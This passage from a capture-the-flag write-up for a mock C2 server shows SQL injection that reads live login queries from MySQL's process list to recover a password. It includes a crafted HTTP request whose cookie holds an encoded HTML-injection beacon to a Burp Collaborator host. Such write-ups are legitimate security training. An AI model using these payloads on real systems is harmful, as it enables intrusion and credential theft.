5. While fuzzing we identify a directory called [releases](https://c2.hackyholidays.h1ctf.com/infrastructure_management/releases) which revels some information about the protection put in place for the login form.
- We notice that it will be impossible to bruteforce (or crack) the password of any user due to the implemented complexity
- There is a time delay of 5 seconds for each login attempt that will make that attack even harder.
6. We also notice that a request is send to the following endpoint
https://c2.hackyholidays.h1ctf.com/infrastructure_management/get_column?column=username

After a while we discover that the `column` parameter is vulnerable to SQLi and we can try dumping the database which gives us a user and a hash, but as already stated there is no point on trying to crack

![Screenshot from 2021-12-22 00-50-48](https://user-images.githubusercontent.com/55701068/151602459-d8afdcc4-3bec-4a1a-88a4-46115c3e29b2.png)

6. Given the information above and a few hints shared by adam (the evil creator of this), We know that
  - The grinch logins often in the server
  - He is also affected by a time delay, even with a valid login

Based on the information above, we consider that maybe since there is a time delay, the SQL query that handles the login will be stored in some place until the 5 seconds pass and it gets evaluated.
After googling a bit we come up with the following table that is of interest
`The INFORMATION_SCHEMA PROCESSLIST Table` (more info [here](https://dev.mysql.com/doc/refman/8.0/en/information-schema-processlist-table.html) )
The table has a column named `INFO` that is of interest to us, since it seems to store the actual query. We can therefore use our SQL injection to attempt to read from that table the `INFO column`

7. Another problem we have is that the endpoint that is vulnerable to SQLi only returns a response of 10 characters long. 
Therefore we ll need to adjust our injection in order to extract the content we want. the request bellow will extract the first part of the password. We can increase the second vaue in the mid() fucntion to extract more parts of the password
```http
GET /infrastructure_management/get_column?column=mid(info,69,10)+FROM+INFORMATION_SCHEMA.PROCESSLIST-- HTTP/1.1
Host: c2.hackyholidays.h1ctf.com
Cookie: candc_token=d7f97196a4a18de63ed841abbea89fd8; authorisation_token=eyJ0b2tlbiI6IlwiPjxpbWcrc3JjPWh0dHA6Ly8ydHd1Y2cyMGR2aDRqbDl1cThxOGt6OGVmNWwzOXMuYnVycGNvbGxhYm9yYXRvci5uZXQ+Iiwic2VydmVyIjoiMTcyLjEwNS5YWC5YWDo4MDAwL1wvP2Zvbz0ifQ==
Connection: close
```
![Screenshot from 2021-12-22 03-42-13](https://user-images.githubusercontent.com/55701068/151602530-8f6a2256-bb46-46af-b01a-908f48160e4b.png)

We continue to attempt to capture the login query by the grinch since he logins every 1 minute and we end up with the password below
**Grinch Password**
`Yo9R38!IdobFZF6eFS3#`

8. We can login now with the credentials
`grinch:Yo9R38!IdobFZF6eFS3#`

And see the panel for the successful attacks the grinch made

![control-c2](https://user-images.githubusercontent.com/55701068/151602609-af82cdd1-9a82-4503-87be-f43df35e06dd.png)

We can then `Burn Infrastructure` and grab the flag


![final-flag](https://user-images.githubusercontent.com/55701068/151602679-6f6232f3-e9f4-46f9-9cf9-f2c54f6d2381.png)
